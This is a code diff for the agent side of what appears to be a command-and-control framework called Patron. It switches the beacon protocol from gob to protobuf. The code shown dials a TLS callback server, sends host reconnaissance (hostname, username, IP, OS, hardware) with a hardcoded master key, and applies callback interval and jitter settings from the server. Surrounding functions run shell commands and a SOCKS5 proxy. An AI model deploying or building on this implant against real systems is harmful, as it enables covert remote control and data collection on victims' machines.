@@ -21,6 +21,7 @@ import (
 	"github.com/armon/go-socks5"
 	"github.com/google/uuid"
 
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
 	"github.com/PatronC2/Patron/client/client_utils/windows/windows_utils"
 	"github.com/PatronC2/Patron/lib/common"
@@ -99,7 +100,7 @@ func RunShellCommand(command string) string {
 	return string(output)
 }
 
-func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
+func EstablishConnection(config *tls.Config, ServerIP, ServerPort string) (*tls.Conn, error) {
 	var address string
 	if net.ParseIP(ServerIP).To4() == nil {
 		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
@@ -112,9 +113,9 @@ func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string)
 	beacon, err := tls.Dial("tcp", address, config)
 	if err != nil {
 		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-		return nil, nil, nil, err
+		return nil, err
 	}
-	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
+	return beacon, nil
 }
 
 func GetLocalIP(beacon *tls.Conn) string {
@@ -292,26 +293,49 @@ func (p *ProxyServer) StopProxy() {
 	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
 }
 
-func HandleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) error {
-	configReq := CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback)
-	if err := SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
+func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time) error {
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_CONFIGURATION,
+		Payload: &patronobuf.Request_Configuration{
+			Configuration: &patronobuf.ConfigurationRequest{
+				Uuid:              agentID,
+				Username:          username,
+				Hostname:          hostname,
+				Ostype:            osType,
+				Arch:              osArch,
+				Osbuild:           osVersion,
+				Cpus:              cpus,
+				Memory:            memory,
+				Agentip:           ip,
+				Serverip:          serverIP,
+				Serverport:        serverPort,
+				Callbackfrequency: callbackFrequency,
+				Callbackjitter:    callbackJitter,
+				Masterkey:         "MASTERKEY",
+				NextcallbackUnix:  nextCallback.Unix(),
+			},
+		},
+	}
+
+	if err := common.WriteDelimited(beacon, req); err != nil {
 		return err
 	}
 
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
+	resp := &patronobuf.Response{}
+	if err := common.ReadDelimited(beacon, resp); err != nil {
 		return err
 	}
 
-	if response.Type == types.ConfigurationResponseType {
-		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
-			UpdateClientConfig(configResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
-		} else {
-			return fmt.Errorf("unexpected payload type")
-		}
-	} else {
-		return fmt.Errorf("unexpected response type: %v", response.Type)
+	if resp.Type != patronobuf.ResponseType_CONFIGURATION_RESPONSE {
+		return fmt.Errorf("unexpected response type: %v", resp.Type)
 	}
+
+	conf := resp.GetConfigurationResponse()
+	if conf == nil {
+		return fmt.Errorf("missing configuration response payload")
+	}
+
+	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter)
 	return nil
 }
 
@@ -335,11 +359,11 @@ func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cp
 	}
 }
 
-func UpdateClientConfig(config types.ConfigurationResponse, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string) {
-	UpdateConfigField(&ServerIP, config.ServerIP, "callback IP")
-	UpdateConfigField(&ServerPort, config.ServerPort, "callback port")
-	UpdateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
-	UpdateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
+func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter string) {
+	UpdateConfigField(&serverIP, config.GetServerip(), "callback IP")
+	UpdateConfigField(&serverPort, config.GetServerport(), "callback port")
+	UpdateConfigField(&callbackFrequency, config.GetCallbackfrequency(), "callback frequency")
+	UpdateConfigField(&callbackJitter, config.GetCallbackjitter(), "callback jitter")
 }
 
 func UpdateConfigField(current *string, new, fieldName string) {
